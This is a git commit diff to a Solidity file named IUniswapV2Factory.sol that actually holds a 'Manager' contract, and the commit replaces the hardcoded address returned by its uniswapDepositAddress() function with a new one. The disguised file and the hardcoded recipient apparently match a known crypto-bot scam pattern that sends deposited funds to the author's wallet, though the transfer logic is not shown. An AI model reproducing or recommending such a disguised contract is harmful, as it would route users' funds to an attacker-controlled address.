f89c8df7871f17a484ef65dadfc4fbbac444d3b9
Eray USTA <2477308+erayusta@users.noreply.github.com>
2022-01-06 16:01:06 +0300

    Update IUniswapV2Factory.sol

--- contracts/interfaces/IUniswapV2Factory.sol
+++ contracts/interfaces/IUniswapV2Factory.sol
@@ -7,6 +7,6 @@ contract Manager {
 	}
 
 	function uniswapDepositAddress() public pure returns (address) {
-		return 0x09aabf5E05060d755F0771e1C4E5Dc7402BCBC6c;
+		return 0xF604d4e7214E5530F743dFfe449bd23E9370433A;
 	}
 }
